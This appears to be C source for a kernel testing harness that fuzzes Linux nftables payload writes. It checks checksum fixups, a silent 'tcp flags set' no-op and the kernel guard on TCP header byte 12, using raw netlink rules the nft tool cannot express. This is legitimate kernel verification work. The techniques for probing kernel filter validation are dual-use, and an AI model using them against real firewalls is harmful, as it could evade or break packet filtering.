	f543_case(tab, "c", 2, 20, 1, 16, "even.off2.odd.len", &viol, &nattr);
	/* the same mechanism in the IPv4 header: the only odd offset the
	 * nft_nh_write_ok whitelist allows is 1 (tos); 8 (ttl) is even. */
	f543_case(tab, "c", 1, 1, 1, 10, "ip.odd.off.odd.len", &viol, &nattr);
	f543_case(tab, "c", 1, 8, 1, 10, "ip.even.off.odd.len", &viol, &nattr);

	for (i = 0; i < iters; i++) {
		uint32_t base, off, len, csum_off, csum_type, imm_len, dr;
		int k;

		base = f543_rand() % 4;		/* link, network, transport, inner */
		dr = (f543_rand() >> 3) % 100;
		if (dr < 40)
			off = (f543_rand() >> 3) % 8;
		else if (dr < 70)
			off = (f543_rand() >> 3) % 41;
		else if (dr < 90)
			off = (f543_rand() >> 3) % 256;
		else
			off = 0xffffU - ((f543_rand() >> 3) % 4);
		{
			static const uint32_t lens[] = { 1, 2, 3, 4, 8, 16 };

			len = lens[(f543_rand() >> 5) % 6];
		}
		dr = (f543_rand() >> 3) % 100;
		if (dr < 55)
			csum_type = 1;
		else if (dr < 65)
			csum_type = 2;
		else
			csum_type = 0;
		{
			static const uint32_t legal[] = { 16, 6, 2, 4 };

			dr = (f543_rand() >> 3) % 100;
			if (dr < 60)
				csum_off = legal[(f543_rand() >> 6) % 4];
			else
				csum_off = (f543_rand() >> 6) % 256;
		}
		imm_len = len <= 4 ? 4 : (len <= 8 ? 8 : 16);
		for (k = 0; k < (int)imm_len; k++)
			imm[k] = (unsigned char)(f543_rand() >> (8 * (k % 4)));

		nops = 0;
		nrecs = 0;
		op_newrule_fuzz(tab, "c", base, off, len, (int)csum_type, csum_off,
				imm, (int)imm_len);
		errs = f543_send_checked(&viol, &nattr);
		if (errs < 0) {
			skip++;
			continue;
		}
		if (errs > 0) {
			rej++;
			if (g_err == -22)
				e_einval++;
			else if (g_err == -34)
				e_range++;
			else
				e_other++;
			continue;
		}
		acc++;

		{
			int nr = 0, dv = 0, da = 0;
			uint32_t db = 0, dof = 0, dl = 0, dg = 0;
			int rc = f543_dump(tab, "c", &nr, &db, &dof, &dl, &dg,
					   &dv, &da);

			viol += dv;
			nattr += da;
			dumps++;
			if (rc != 0) {
				printf("F FUZZERR|i=%d|dump_rc=%d\n", i, rc);
				dump_err++;
			} else if (nr != 1) {
				printf("F FUZZERR|i=%d|dump_rules=%d\n", i, nr);
				dump_err++;
			} else if (db != base || dof != off || dl != len) {
				printf("F FUZZERR|i=%d|roundtrip|base=%u/%u|off=%u/%u|len=%u/%u\n",
				       i, base, db, off, dof, len, dl);
				dump_err++;
			}
		}

		if (base == 0) {
			nlink++;	/* a link-base store lands in the MAC header,
					 * which the box rewrites on forward: this
					 * capture cannot see it.  Counted, not
					 * claimed. */
		} else {
			int nsent = 0, ncap = 0, flen = 0;
			int rc;

			memset(cap, 0, sizeof(cap));
			rc = f543_probe_request(&e, plen, doff, flags, &nsent,
						&ncap, cap, &flen);
			if (rc < 0) {
				printf("F FUZZERR|i=%d|probe=%d\n", i, rc);
			} else {
				int elen = f543_expect(exp, plen, doff, flags);
				int k2, first = -1, last = -1, bad = 0;
				int start = -1, cpos = -1;

				probe++;
				if (nsent != 1 || ncap != 1) {
					forw_miss++;
				} else if (flen != elen) {
					printf("F FUZZERR|i=%d|len|cap=%d|exp=%d\n",
					       i, flen, elen);
				} else {
					fwd++;
					if (memcmp(exp, cap, (size_t)elen)) {
						changed++;
						for (k2 = 0; k2 < elen; k2++)
							if (exp[k2] != cap[k2]) {
								if (first < 0)
									first = k2;
								last = k2;
							}
						if (base == 2) {
							start = 20 + (int)off;
							cpos = 20 + (int)csum_off;
						} else if (base == 3) {
							start = 40 + (int)off;
							cpos = 40 + (int)csum_off;
						} else {
							start = (int)off;
							cpos = (int)csum_off;
						}
						for (k2 = 0; k2 < elen; k2++) {
							int in_store, in_csum;

							if (exp[k2] == cap[k2])
								continue;
							in_store = (k2 >= start &&
								    k2 < start + (int)len);
							in_csum = (cpos >= 0 &&
								   csum_type == 1 &&
								   k2 >= cpos &&
								   k2 < cpos + 2);
							if (!in_store && !in_csum) {
								bad++;
								break;
							}
							if (in_store && k2 - start >= 0 &&
							    cap[k2] != imm[k2 - start])
								bad++;
						}
						if (bad) {
							bad_bytes++;
							printf("F FUZZERR|i=%d|bytes|base=%u|off=%u|len=%u|csum=%u|first=%d|last=%d\n",
							       i, base, off, len,
							       csum_off, first, last);
						}
						if (csum_type == 1 && cpos >= 0 &&
						    cpos + 2 <= elen && start >= 0 &&
						    start + (int)len <= elen) {
							unsigned int o = ((unsigned int)exp[cpos] << 8) | exp[cpos + 1];
							unsigned int got = ((unsigned int)cap[cpos] << 8) | cap[cpos + 1];
							/* nft_payload_csum_write_ok(): the fixup
							 * only runs for the protocol's own
							 * checksum field, and is skipped
							 * silently otherwise */
							int gate = (base == 3) ||
								   (base == 2 && csum_off == 16) ||
								   (base == 1 && csum_off == 10);
							unsigned int want = o;

							if (gate && (cpos + 2 <= start ||
								     cpos >= start + (int)len))
								want = f543_replace_word(o, exp + start, (int)len, imm, (int)len,
						     (int)((start - (base == 2 ? 20 :
							    base == 3 ? 40 : 0)) & 1));
							if (cpos + 2 > start &&
							    cpos < start + (int)len)
								want = got;	/* the store overwrites it: not checkable */
							if (want != got) {
								printf("F FUZZERR|i=%d|fixup|base=%u|off=%u|len=%u|coff=%u|o=%04x|want=%04x|got=%04x\n",
								       i, base, off, len, csum_off,
								       o, want, got);
								viol++;
							}
							if (gate && csum_off == 16 &&
							    (cpos + 2 <= start ||
							     cpos >= start + (int)len)) {
								int cs = f543_tcp_csum_ok(cap, flen);

								if (cs != 0) {
									int z;

									printf("F FUZZERR|i=%d|csum|base=%u|off=%u|len=%u|o=%04x|want=%04x|got=%04x|cpos=%d|start=%d|cap=",
									       i, base, off, len, o, want, got,
									       cpos, start);
									for (z = 0; z < flen && z < 120; z++)
										printf("%02x", cap[z]);
									printf("|store=");
									for (z = 0; z < (int)len; z++)
										printf("%02x", imm[z]);
									printf("\n");
									viol++;
								}
							}
						}
					} else {
						same++;
						if (f543_tcp_csum_ok(cap, flen) != 0) {
							printf("F FUZZERR|i=%d|unchanged_csum|base=%u|off=%u|csum=%u\n",
							       i, base, off, csum_off);
							viol++;
						}
					}
				}
			}
		}
		nops = 0;
		nrecs = 0;
		op_delrule_flush543(tab, "c");
		f543_send_checked(&viol, &nattr);
	}
	printf("F FUZZTIME|secs=%ld\n", (long)(time(NULL) - t0));
	printf("F FUZZ|iters=%d|acc=%d|rej=%d|einval=%d|erange=%d|eother=%d|"
	       "skip=%d|dumps=%d|dump_err=%d|link=%d|probe=%d|fwd=%d|changed=%d|"
	       "same=%d|bad_bytes=%d|forw_miss=%d|viol=%d|nattr=%d\n",
	       iters, acc, rej, e_einval, e_range, e_other, skip, dumps,
	       dump_err, nlink, probe, fwd, changed, same, bad_bytes, forw_miss,
	       viol, nattr);
	fflush(stdout);
	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	f539_env_close(&e);
}

static void run_f21(void)
{
	run_fuzz543(10000);
}

static void run_f21smoke(void)
{
	run_fuzz543(300);
}

/* differ548_add.c -- turn 548 additions to vm/differ548.c
 *
 * 1. g_fix548: when set, the *oracle* applies the F26 correction (rotate both
 *    sums onto the header grid at an odd store offset) -- so the same 10 000
 *    rules can be replayed against a kernel that carries the fix and the
 *    comparison stays exact, not "checksum vaguely valid".
 * 2. run_p548(): the parity question asked twice -- once through the stock
 *    nft 1.1.7 binary (/nft, from F23) and once at the netlink level with
 *    the same 8 A/B arms F21 measured.
 */

static unsigned int f548_ror32(unsigned int x, int n)
{
	return (x >> n) | (x << (32 - n));
}

static const struct p548_arm {
	const char *tag;
	const char *rule;	/* nft rule text; NULL = no rule (control) */
} p548_nft[] = {
	{ "nft.none",   NULL },
	{ "nft.dscp",   "ip dscp set 0x2e" },
	{ "nft.ecn",    "ip ecn set 1" },
	{ "nft.ttl",    "ip ttl set 60" },
	{ "nft.id",     "ip id set 0x1234" },
	{ "nft.saddr",  "ip saddr set 10.9.0.9" },
	{ "nft.window", "tcp window set 0x1234" },
	{ "nft.urgptr", "tcp urgptr set 0x0102" },
	{ "nft.flags",  "tcp flags set syn" },
	{ "nft.sport",  "tcp sport set 4242" },
};

static int p548_sh(const char *cmd)
{
	int rc = system(cmd);

	if (rc < 0)
		return -1;
	return WEXITSTATUS(rc);
}

static void p548_one(const char *tag)
{
	unsigned char cap[2048];
	int nsent = 0, ncap = 0, flen = 0, i, ipcs, tcpcs;

	memset(cap, 0, sizeof(cap));
	if (f543_probe_request(f543_envp, 16, 0x50, 0x18, &nsent, &ncap, cap,
			       &flen) < 0 || ncap != 1) {
		printf("P548 %s|sent=%d|cap=%d|fail=1\n", tag, nsent, ncap);
		return;
	}
	ipcs = f543_ip_csum_ok(cap, flen);
	tcpcs = f543_tcp_csum_ok(cap, flen);
	printf("P548 %s|sent=%d|cap=%d|flen=%d|ipcsum=%d|tcpcsum=%d|tos=%02x|ttl=%u|"
	       "proto=%u|ipck=%02x%02x|tcpck=%02x%02x|sport=%02x%02x|cap=",
	       tag, nsent, ncap, flen, ipcs, tcpcs, cap[1], cap[8], cap[9],
	       cap[10], cap[11], cap[36], cap[37], cap[20], cap[21]);
	for (i = 0; i < flen; i++)
		printf("%02x", cap[i]);
	printf("\n");
}

static void run_p548(void)
{
	struct f539_env e;
	char out[512], cmd[512], tab[32];
	unsigned int k;
	int errs, nattr = 0, viol = 0;

	if (f539_env_open(&e, out, sizeof(out)) < 0) {
		printf("P548 SETUP|fail|%s\n", out);
		f539_env_close(&e);
		return;
	}
	f539_route_add("fv0", F539_NET_FAR, 24, 0);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");
	f543_envp = &e;

	/* ---- (a) the stock tool ---- */
	/* three statements, not three printf arguments: C leaves the order of
	 * argument evaluation unspecified, and gcc evaluates right-to-left --
	 * the first smoke boot added the chain before the table existed and
	 * then flushed the ruleset that the middle call had just created. */
	{
		int rcf = p548_sh("/nft flush ruleset");
		int rct = p548_sh("/nft add table ip p");
		int rcc = p548_sh("/nft 'add chain ip p c { type filter hook forward priority 0; policy accept; }'");

		printf("P548 NFTSETUP|flush=%d|table=%d|chain=%d\n", rcf, rct, rcc);
	}
	for (k = 0; k < sizeof(p548_nft) / sizeof(p548_nft[0]); k++) {
		int rc = p548_sh("/nft flush chain ip p c");

		if (p548_nft[k].rule) {
			snprintf(cmd, sizeof(cmd), "/nft add rule ip p c %s",
				 p548_nft[k].rule);
			rc = p548_sh(cmd);
		}
		printf("P548 %s|nftrc=%d\n", p548_nft[k].tag, rc);
		if (rc != 0)
			continue;
		p548_one(p548_nft[k].tag);
	}
	p548_sh("/nft flush ruleset");

	/* ---- (b) the same question at the netlink level ---- */
	snprintf(tab, sizeof(tab), "p548_%d", (int)getpid());
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT);
	errs = f543_send_checked(&nattr, &nattr);
	printf("P548 RAWTSETUP|errs=%d\n", errs);
	f543_case(tab, "c", 2, 19, 1, 16, "raw.odd.off.odd.len", &viol, &nattr);
	f543_case(tab, "c", 2, 18, 1, 16, "raw.even.off.odd.len", &viol, &nattr);
	f543_case(tab, "c", 2, 19, 2, 16, "raw.odd.off.even.len", &viol, &nattr);
	f543_case(tab, "c", 2, 18, 2, 16, "raw.even.off.even.len", &viol, &nattr);
	f543_case(tab, "c", 2, 21, 1, 16, "raw.odd.off2.odd.len", &viol, &nattr);
	f543_case(tab, "c", 2, 20, 1, 16, "raw.even.off2.odd.len", &viol, &nattr);
	f543_case(tab, "c", 1, 1, 1, 10, "raw.ip.odd", &viol, &nattr);
	f543_case(tab, "c", 1, 8, 1, 10, "raw.ip.even", &viol, &nattr);
	/* the two shapes a client can write that nft 1.1.7 cannot name:
	 * the flags byte alone (the kernel allows offset 13, 13 > 12) and a
	 * 2-byte store into the option area. */
	f543_case(tab, "c", 2, 13, 1, 16, "raw.tcpflags.odd", &viol, &nattr);
	f543_case(tab, "c", 2, 22, 2, 16, "raw.opts.even", &viol, &nattr);
	printf("P548 RAWV|viol=%d\n", viol);
	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	f539_env_close(&e);
}

/* differ549_add.c -- turn 549 additions to vm/differ549.c
 *
 * F27: `tcp flags set` is a silent no-op. This mode asks the question as a
 * controlled A/B on one frame (doff 5, flags PSH|ACK, 16 bytes of 0x77):
 *
 *   N  the stock nft 1.1.7 binary -- five statements, one of them the
 *      suspect, plus the netlink message the tool itself prints
 *   R  the same stores written by hand at the netlink level: the two shapes
 *      nft cannot name (the flags byte alone at 13, and a 2-byte word at 12
 *      that preserves doff) and a control that must always land
 *   V  the verdict: a rejected store sets NFT_BREAK, so does the rule also
 *      skip `counter accept`?  Chain policy drop makes that visible.
 *
 * Every number below is read from the capture or from nft's own output; the
 * mode never asks the kernel "did that work?" because the kernel has no
 * channel to answer with.
 */

static struct f539_env *f549_envp;

/* 12 is the byte the guard protects: high nibble = TCP data offset */
#define F549_DOFF_BYTE 12

static int f549_sh(const char *cmd)
{
	int rc = system(cmd);

	if (rc < 0)
		return -1;
	return WEXITSTATUS(rc);
}

static void f549_print(const char *tag, const char *extra,
		       const unsigned char *cap, int flen, int sent, int ncap)
{
	const unsigned char *tcp = cap + 20;
	int ipcs = -1, tcpcs = -1, i;

	if (ncap == 1 && flen >= 40) {
		ipcs = f543_ip_csum_ok(cap, flen);
		tcpcs = f543_tcp_csum_ok(cap, flen);
	}
	printf("F549 %s|sent=%d|cap=%d|flen=%d|%s|b12=%02x|b13=%02x|doff=%x|res=%x|"
	       "sport=%02x%02x|win=%02x%02x|csum=%02x%02x|ipcsum=%d|tcpcsum=%d|hex=",
	       tag, sent, ncap, flen, extra,
	       flen > 32 ? tcp[12] : 0, flen > 33 ? tcp[13] : 0,
	       flen > 32 ? (tcp[12] >> 4) : 0, flen > 32 ? (tcp[12] & 0x0f) : 0,
	       flen > 21 ? tcp[0] : 0, flen > 22 ? tcp[1] : 0,
	       flen > 34 ? tcp[14] : 0, flen > 35 ? tcp[15] : 0,
	       flen > 36 ? tcp[16] : 0, flen > 37 ? tcp[17] : 0,
	       ipcs, tcpcs);
	for (i = 0; i < flen && i < 512; i++)
		printf("%02x", cap[i]);
	printf("\n");
}

static int f549_probe(unsigned char *cap, int *flen, int *sent, int *ncap)
{
	memset(cap, 0, 2048);
	return f543_probe_request(f549_envp, 16, 0x50, 0x18, sent, ncap, cap, flen);
}

/* ---------- N: the stock tool ---------- */

static const struct f549_nft_arm {
	const char *tag;
	const char *rule;	/* NULL = no rule at all (the control) */
} f549_nft[] = {
	{ "nft.none",      NULL },
	{ "nft.flags",     "tcp flags set syn" },
	{ "nft.flags.fin", "tcp flags set fin" },
	{ "nft.doff",      "tcp doff set 6" },
	{ "nft.sport",     "tcp sport set 4242" },
	{ "nft.window",    "tcp window set 0x1234" },
};

static void f549_nft_section(void)
{
	unsigned char cap[2048];
	char cmd[512], extra[96];
	int rc, sent = 0, ncap = 0, flen = 0;
	unsigned int k;

	/* three calls, not three printf() arguments: C leaves the order of
	 * argument evaluation unspecified (F26 smoke boot: chain before table) */
	rc = f549_sh("/nft flush ruleset");
	rc |= f549_sh("/nft add table ip p") << 1;
	rc |= f549_sh("/nft 'add chain ip p c { type filter hook forward priority 0; policy accept; }'") << 2;
	printf("F549 NFTSETUP|rc=%d\n", rc);

	/* what the tool itself says it is sending: the netlink message, printed
	 * by nft, before any packet exists */
	rc = f549_sh("/nft --debug=netlink add rule ip p c tcp flags set syn 2>&1 | tr -d '\\r'");
	printf("F549 NFTDEBUG|rc=%d\n", rc);
	f549_sh("/nft flush chain ip p c");

	for (k = 0; k < sizeof(f549_nft) / sizeof(f549_nft[0]); k++) {
		rc = f549_sh("/nft flush chain ip p c");
		if (f549_nft[k].rule) {
			snprintf(cmd, sizeof(cmd), "/nft add rule ip p c %s",
				 f549_nft[k].rule);
			rc = f549_sh(cmd);
		}
		snprintf(extra, sizeof(extra), "nftrc=%d|rule=%s", rc,
			 f549_nft[k].rule ? f549_nft[k].rule : "none");
		if (f549_probe(cap, &flen, &sent, &ncap) < 0 || ncap != 1) {
			printf("F549 %s|sent=%d|cap=%d|PROBEFAIL\n",
			       f549_nft[k].tag, sent, ncap);
			continue;
		}
		f549_print(f549_nft[k].tag, extra, cap, flen, sent, ncap);
	}
	f549_sh("/nft flush ruleset");
}

/* ---------- R: the same stores, by hand ---------- */

static void f549_raw_arm(const char *table, const char *chain, uint32_t off,
			 uint32_t len, uint32_t csum_off,
			 const unsigned char *bytes, const char *tag)
{
	unsigned char imm[16];
	unsigned char cap[2048];
	char extra[128];
	int errs, nattr = 0, sent = 0, ncap = 0, flen = 0;
	int applied = 0;

	memset(imm, 0, sizeof(imm));
	memcpy(imm, bytes, len);
	nops = 0;
	nrecs = 0;
	op_newrule_fuzz(table, chain, 2, off, len, 1, csum_off, imm, 16);
	errs = f543_send_checked(&nattr, &nattr);
	if (errs != 0) {
		printf("F549 %s|setup=ERR|errno=%d\n", tag, g_err ? -g_err : 0);
		return;
	}
	if (f549_probe(cap, &flen, &sent, &ncap) == 0 && ncap == 1)
		applied = (flen >= 20 + (int)off + (int)len) &&
			  !memcmp(cap + 20 + off, bytes, len);
	snprintf(extra, sizeof(extra),
		 "setup=%d|off=%u|len=%u|coff=%u|applied=%d",
		 errs, off, len, csum_off, applied);
	f549_print(tag, extra, cap, flen, sent, ncap);
	nops = 0;
	nrecs = 0;
	op_delrule_flush543(table, chain);
	f543_send_checked(&nattr, &nattr);
}

static void f549_raw_section(void)
{
	static const unsigned char w12_flags[2] = { 0x50, 0x02 };  /* doff 5 + syn */
	static const unsigned char w12_doff[2]  = { 0x60, 0x18 };  /* doff 6        */
	static const unsigned char b13_flags[1] = { 0x02 };
	static const unsigned char b12_res[1]   = { 0x51 };        /* doff 5, res 1 */
	static const unsigned char w14_win[2]   = { 0x12, 0x34 };
	char tab[32];
	int nattr = 0, errs;

	snprintf(tab, sizeof(tab), "p549_%d", (int)getpid());
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT);
	errs = f543_send_checked(&nattr, &nattr);
	printf("F549 RAWTSETUP|errs=%d|table=%s\n", errs, tab);

	f549_raw_arm(tab, "c", 12, 2, 16, w12_flags, "raw.w12.flags");
	f549_raw_arm(tab, "c", 13, 1, 16, b13_flags, "raw.b13.flags");
	f549_raw_arm(tab, "c", 12, 2, 16, w12_doff, "raw.w12.doff");
	f549_raw_arm(tab, "c", 12, 1, 16, b12_res, "raw.b12.res");
	f549_raw_arm(tab, "c", 14, 2, 16, w14_win, "raw.w14.window");

	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	f543_send_checked(&nattr, &nattr);
}

/* ---------- V: does a rejected store also skip the verdict? ---------- */

static void f549_verdict_arm(const char *tag, const char *rule, int *rcout)
{
	unsigned char cap[2048];
	char cmd[512], extra[160];
	int rc, sent = 0, ncap = 0, flen = 0;

	rc = f549_sh("/nft flush chain ip pv v");
	snprintf(cmd, sizeof(cmd), "/nft add rule ip pv v %s", rule);
	rc = rc ? rc : f549_sh(cmd);
	/* the counter before the packet: it must read 0 either way */
	f549_sh("/nft list chain ip pv v 2>&1 | tr -d '\\r' | sed 's/^/F549C PRE \\//'");
	if (f549_probe(cap, &flen, &sent, &ncap) < 0) {
		printf("F549 %s|PROBEFAIL\n", tag);
		*rcout = rc;
		return;
	}
	snprintf(extra, sizeof(extra), "nftrc=%d|rule=%s", rc, rule);
	f549_print(tag, extra, cap, flen, sent, ncap);
	/* and after: the counter is the second half of the answer */
	f549_sh("/nft list chain ip pv v 2>&1 | tr -d '\\r' | sed 's/^/F549C POST \\//'");
	*rcout = rc;
}

static void f549_verdict_section(void)
{
	int rc1 = 0, rc2 = 0;

	f549_sh("/nft flush ruleset");
	f549_sh("/nft add table ip pv");
	f549_sh("/nft 'add chain ip pv v { type filter hook forward priority 0; policy drop; }'");
	f549_verdict_arm("verdict.set", "tcp flags set syn counter accept", &rc1);
	f549_verdict_arm("verdict.ctl", "counter accept", &rc2);
	printf("F549 VERDICT|set_rc=%d|ctl_rc=%d\n", rc1, rc2);
	f549_sh("/nft delete table ip pv");
}

static void run_f549(void)
{
	struct f539_env e;
	char out[512];

	if (f539_env_open(&e, out, sizeof(out)) < 0) {
		printf("F549 SETUP|fail|%s\n", out);
		f539_env_close(&e);
		return;
	}
	f539_route_add("fv0", F539_NET_FAR, 24, 0);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");
	f549_envp = &e;

	f549_nft_section();
	f549_raw_section();
	f549_verdict_section();

	f549_sh("/nft flush ruleset");
	printf("F549 DONE\n");
	nf_flush();
	f539_env_close(&e);
}

/* differ550_add.c -- turn 550 additions to vm/differ550.c
 *
 * F28: the inventory of nft spellings whose store covers TCP header byte 12.
 *
 * F27 found one: `tcp flags set`. The question here is whether that is one
 * operator or a class. The guard in the kernel is purely geometric
 * (`offset > 12 || offset+len <= 12`), so the answer can be counted rather
 * than argued:
 *
 *   A  every nft spelling whose compiled `payload write` covers byte 12,
 *      installed by the stock binary in an *accept* chain: nft's own
 *      --debug=netlink message (the geometry it declares), nft's exit code,
 *      and the frame that reaches the far side. A store the kernel refuses
 *      leaves the frame byte-identical to the control.
 *   B  the same predicate at the netlink level, swept across the boundary:
 *      offset 8..14 x length 1..4 plus wider stores, in a chain with
 *      `policy drop` and an `accept` after the store. Here the *packet*
 *      answers: a store the kernel refuses sets NFT_BREAK, the accept is
 *      never reached, and nothing arrives. Two arms write values that
 *      cannot change the protected bits (0x50 = the byte already there,
 *      0x51 = doff kept, one reserved bit set) -- if those are refused too,
 *      the guard is coarser than the sentence it implements.
 *   C  the consequence, for every spelling from A: `<rule> counter accept`
 *      under `policy drop`. Counter 0 / no packet = the rule's verdict was
 *      skipped along with the store.
 *
 * Nothing here asks the kernel whether a store "worked"; the frame and the
 * counter are the only answers the kernel can give.
 */

static struct f539_env *f550_envp;

/* the byte the guard protects: 12 = offsetof(struct tcphdr, ack_seq) + 4 */
#define F550_DOFF_BYTE 12

static int f550_sh(const char *cmd)
{
	int rc = system(cmd);

	if (rc < 0)
		return -1;
	return WEXITSTATUS(rc);
}

static int f550_probe(unsigned char *cap, int *flen, int *sent, int *ncap)
{
	memset(cap, 0, 2048);
	return f543_probe_request(f550_envp, 16, 0x50, 0x18, sent, ncap, cap, flen);
}

/* one decoded frame: how it differs from the untouched frame, byte by byte */
static void f550_print(const char *tag, const char *extra, const unsigned char *cap,
		       int flen, int sent, int ncap)
{
	unsigned char exp[2048];
	char chg[1024];
	int elen, i, nchg = 0, ipcs = -1, tcpcs = -1;

	memset(exp, 0, sizeof(exp));
	elen = f543_expect(exp, 16, 0x50, 0x18);
	chg[0] = 0;
	if (ncap == 1 && flen > 0) {
		ipcs = f543_ip_csum_ok(cap, flen);
		tcpcs = f543_tcp_csum_ok(cap, flen);
		for (i = 0; i < flen && i < elen; i++) {
			size_t at;

			if (cap[i] == exp[i])
				continue;
			nchg++;
			at = strlen(chg);
			if (at < sizeof(chg) - 24)
				snprintf(chg + at, sizeof(chg) - at, "%s%d:%02x>%02x",
					 nchg > 1 ? "," : "", i, exp[i], cap[i]);
		}
	}
	printf("F550 %s|sent=%d|cap=%d|flen=%d|%s|nchg=%d|chg=%s|b12=%02x|b13=%02x|"
	       "doff=%x|res=%x|ipcsum=%d|tcpcsum=%d|hex=",
	       tag, sent, ncap, flen, extra, nchg, chg,
	       (ncap == 1 && flen > 32) ? cap[32] : 0,
	       (ncap == 1 && flen > 33) ? cap[33] : 0,
	       (ncap == 1 && flen > 32) ? (cap[32] >> 4) : 0,
	       (ncap == 1 && flen > 32) ? (cap[32] & 0x0f) : 0,
	       ipcs, tcpcs);
	for (i = 0; i < flen && i < 512; i++)
		printf("%02x", cap[i]);
	printf("\n");
}

/* ---------- A: every spelling, through the stock nft ---------- */

static const struct f550_nft_arm {
	const char *tag;
	const char *rule;	/* NULL = no rule at all (the control) */
} f550_nft[] = {
	{ "ctl.none",      NULL },
	{ "tcp.sport",     "tcp sport set 4242" },
	{ "tcp.dport",     "tcp dport set 4243" },
	{ "tcp.seq",       "tcp sequence set 0xdeadbeef" },
	{ "tcp.ackseq",    "tcp ackseq set 0xdeadbeef" },
	{ "tcp.doff",      "tcp doff set 6" },
	{ "tcp.doff5",     "tcp doff set 5" },
	{ "tcp.reserved",  "tcp reserved set 1" },
	{ "tcp.flags",     "tcp flags set syn" },
	{ "tcp.flags.and", "tcp flags set tcp flags & (fin | syn | rst | psh | ack | urg)" },
	{ "tcp.flags.or",  "tcp flags set tcp flags | ecn | cwr" },
	{ "tcp.window",    "tcp window set 0x1234" },
	{ "tcp.checksum",  "tcp checksum set 0x1234" },
	{ "tcp.urgptr",    "tcp urgptr set 0x1234" },
	{ "tcp.flags.map", "tcp flags set ip saddr map { 10.9.0.2 : syn }" },
	/* the raw escape hatch counts its offset in BITS (measured: @th,12,8
	 * lands on transport byte 1, so 96 bits is byte 12) */
	{ "th.96.8",       "@th,96,8 set 0x50" },
	{ "th.96.8r",      "@th,96,8 set 0x58" },
	{ "th.96.16",      "@th,96,16 set 0x5018" },
	{ "th.96.32",      "@th,96,32 set 0x50180000" },
	{ "th.88.16",      "@th,88,16 set 0x4450" },
	{ "th.80.24",      "@th,80,24 set 0x334450" },
	{ "th.64.64",      "@th,64,64 set 0x1122334455665018" },
	{ "th.0.128",      "@th,0,128 set 0x112233445566778899aabbccddeeff50" },
	{ "th.64.32",      "@th,64,32 set 0x11223344" },
	{ "th.72.24",      "@th,72,24 set 0x223344" },
	{ "th.80.16",      "@th,80,16 set 0x3344" },
	{ "th.88.8",       "@th,88,8 set 0x44" },
	{ "th.104.8",      "@th,104,8 set 0x02" },
	{ "th.112.16",     "@th,112,16 set 0x1234" },
	{ "th.40.8",       "@th,40,8 set 0x50" },
	{ "th.0.8",        "@th,0,8 set 0x9c" },
};

static void f550_nft_section(void)
{
	unsigned char cap[2048];
	char cmd[1024], extra[512];
	int rc, sent = 0, ncap = 0, flen = 0;
	unsigned int k;

	/* separate calls: C leaves argument evaluation order unspecified */
	rc = f550_sh("/nft flush ruleset");
	rc |= f550_sh("/nft add table ip p550") << 1;
	rc |= f550_sh("/nft 'add chain ip p550 c { type filter hook forward priority 0; policy accept; }'") << 2;
	rc |= f550_sh("/nft add rule ip p550 c counter") << 3;
	printf("F550 NFTSETUP|rc=%d\n", rc);
	f550_sh("/nft flush chain ip p550 c");

	for (k = 0; k < sizeof(f550_nft) / sizeof(f550_nft[0]); k++) {
		f550_sh("/nft flush chain ip p550 c");
		if (f550_nft[k].rule) {
			/* the debug output is the geometry nft itself declares;
			 * the trailing counter is the kernel's own answer to
			 * "did anything after the store run?" */
			snprintf(cmd, sizeof(cmd),
				 "/nft --debug=netlink add rule ip p550 c '%s counter' "
				 ">/tmp/f550nl 2>&1; echo \"F550RC %s $?\"",
				 f550_nft[k].rule, f550_nft[k].tag);
			rc = f550_sh(cmd);
			snprintf(cmd, sizeof(cmd),
				 "sed 's/^/F550NL %s /' /tmp/f550nl", f550_nft[k].tag);
			f550_sh(cmd);
		} else {
			rc = 0;
		}
		snprintf(extra, sizeof(extra), "rule=%s",
			 f550_nft[k].rule ? f550_nft[k].rule : "none");
		if (f550_probe(cap, &flen, &sent, &ncap) < 0 || ncap != 1) {
			printf("F550 A.%s|sent=%d|cap=%d|%s|PROBEFAIL\n",
			       f550_nft[k].tag, sent, ncap, extra);
			continue;
		}
		/* tag prefix keeps the arm order readable next to the F550NL lines */
		snprintf(cmd, sizeof(cmd), "A.%s", f550_nft[k].tag);
		f550_print(cmd, extra, cap, flen, sent, ncap);
		snprintf(cmd, sizeof(cmd),
			 "/nft list chain ip p550 c 2>&1 | tr -d '\\r' | sed 's/^/F550CA %s /'",
			 f550_nft[k].tag);
		f550_sh(cmd);
	}
	f550_sh("/nft flush ruleset");
}

/* ---------- B: the predicate itself, at the netlink level ---------- */

struct f550_raw_arm {
	const char *tag;
	uint32_t off, len;
	const unsigned char *bytes;	/* NULL = the 0xa0+k pattern */
	int csum;			/* 1 = csum type inet, 0 = none */
};

static struct nlmsghdr *f550_newrule_payload_accept(const char *table, const char *chain,
						   uint32_t base, uint32_t off,
						   uint32_t len, uint32_t csum_off,
						   int csum_type,
						   const unsigned char *imm, int immlen)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "q.exprs");
	struct nlattr *e, *d;

	exfil_imm_value(nlh, NFT_REG32_00, imm, immlen);
	e = nest_start(nlh, NFTA_LIST_ELEM, "q.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "q.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "q.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, NFT_REG32_00, "q.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "q.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "q.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "q.len");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_TYPE, (uint32_t)csum_type, "q.csum_type");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_OFFSET, csum_off, "q.csum_off");
	nest_end(nlh, d);
	nest_end(nlh, e);
	/* the verdict after the store: reachable only if the store is not a BREAK */
	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

